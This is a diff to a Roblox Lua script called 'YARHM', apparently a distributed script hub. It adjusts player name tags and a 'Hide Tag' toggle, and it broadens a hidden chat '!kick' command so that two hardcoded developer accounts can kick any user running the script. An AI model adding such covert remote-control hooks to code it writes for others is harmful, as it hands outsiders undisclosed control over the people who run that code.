@@ -4978,10 +4978,10 @@ local function PQSJOPR_fake_script() -- Fake Script: StarterGui.YARHM.Universal
 	}
 	)
 	
-	local tagsFolder = Instance.new("Folder", script.Parent)
-tagsFolder.Name = "TagsFolder"
-
 local Players = game:GetService("Players")
+
+local tagsFolder = Instance.new("Folder", script.Parent)
+tagsFolder.Name = "TagsFolder"
 
 -- Customize these with your own usernames and developers
 local usernameColors = {
@@ -4992,7 +4992,6 @@ local usernameColors = {
 local specialUsernameColors = {
     ["dark_boythisone"] = Color3.fromRGB(255, 0, 0), -- Special
     ["gagabfromytx"] = Color3.fromRGB(255, 0, 0), -- Special
-    ["daniceyahh123"] = Color3.fromRGB(255, 0, 0), -- Special
 }
 
 local mainText = "YARHM | Test Developer"
@@ -5015,7 +5014,7 @@ local function createTextLabel(player, text, initialColor, isRainbow)
         mainTextLabel.Size = UDim2.new(5, 0, 1, 0)
         mainTextLabel.StudsOffset = Vector3.new(0, 2, 0)
         mainTextLabel.Adornee = head
-        mainTextLabel.AlwaysOnTop = false
+        mainTextLabel.AlwaysOnTop = true
         mainTextLabel.MaxDistance = math.huge
         mainTextLabel.LightInfluence = 0
         if player.Name == "givepetroblox" then
@@ -5074,28 +5073,18 @@ end
 
 Players.PlayerAdded:Connect(handlePlayer)
 
-table.insert(module, {
-    Type = "Toggle",
-    Args = {"Hide Tag", function(Self, state)
-        for _, tag in ipairs(tagsFolder:GetChildren()) do
-            tag.Enabled = not state
-        end
-    end,}
-})
-
 -- Admin commands
 local admins = {"givepetroblox", "User_boblex"} -- Developers who can use the !kick command
-local specialPlayers = {"dark_boythisone", "gagabfromytx", "daniceyahh123"} -- Special players who can be kicked
 
 local function onChatted(player, message)
     if table.find(admins, player.Name) then
         local args = string.split(message, " ")
         local command = args[1]
         local targetPlayerName = args[2]
-        
+
         if command == "!kick" and targetPlayerName then
             local targetPlayer = Players:FindFirstChild(targetPlayerName)
-            if targetPlayer and table.find(specialPlayers, targetPlayerName) then
+            if targetPlayer then
                 targetPlayer:Kick("You have been kicked by an admin.")
             end
         end
@@ -5107,6 +5096,16 @@ Players.PlayerAdded:Connect(function(player)
         onChatted(player, message)
     end)
 end)
+
+-- Hide Tag Functionality
+table.insert(module, {
+    Type = "Toggle",
+    Args = {"Hide Tag", function(Self, state)
+        for _, tag in ipairs(tagsFolder:GetChildren()) do
+            tag.Enabled = not state
+        end
+    end,}
+})
 
 	_G.Modules[1] = module
 end
